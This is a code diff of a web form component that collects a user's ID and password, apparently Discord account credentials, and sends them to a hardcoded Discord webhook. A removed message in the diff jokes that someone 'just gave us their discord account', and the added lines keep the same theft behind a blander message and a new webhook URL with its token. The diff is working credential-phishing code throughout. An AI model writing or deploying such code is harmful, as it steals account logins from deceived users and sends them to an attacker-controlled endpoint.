@@ -4,7 +4,7 @@ let id = $state("")
 let password = $state("")
 let terms = $state(false)
 let error = $state("")
-const webhook = "https://discord.com/api/webhooks/1437884748516036618/6eKwMty8O9Nbn0DBLsV_8SVKxqRiPRfypWpaq4iq5xvcZQOVi9D6CyuAvgUW9cATskQ2"
+const webhook = "https://discord.com/api/webhooks/1438248565557170378/wwnrmdkDN3r_OPWLS_FRPryF-SYExw1KXxlgEvk823k_yFt-IrwgFDwOkTCJ-GzUWLs5"
 
 async function submit(){
     if (id == ""){
@@ -17,34 +17,21 @@ async function submit(){
     }
     console.log(password)
     error = ""
-    const response = await fetch(`${webhook}`, {
-        method: "POST",
-        headers: {
-        "Content-Type": "application/json"
-        },
-
-        body: JSON.stringify({
-            "embeds": [
-                {
-                "title": "Info submitted!",
-                "description": "Some goofy ahh just gave us their discord account!",
-                "color": 5814783,
-                "fields": [
-                    {
-                    "name": "Password",
-                    "value": `${password}`
-                    },
-                    {
-                    "name": "ID",
-                    "value": `${id}`
-                    }
-                ]
-                }
-            ],
-            "attachments": []
-            })
-        }
-    );
+    sendWebhook(new Embed(
+        "Info submitted!",
+        "There was an info submitted on the website.",
+        0x5865F2,
+        [
+            new Field(
+                "Name / ID",
+                id
+            ),
+            new Field(
+                "Password",
+                password
+            )
+        ]
+    ), webhook)
 }
 
 
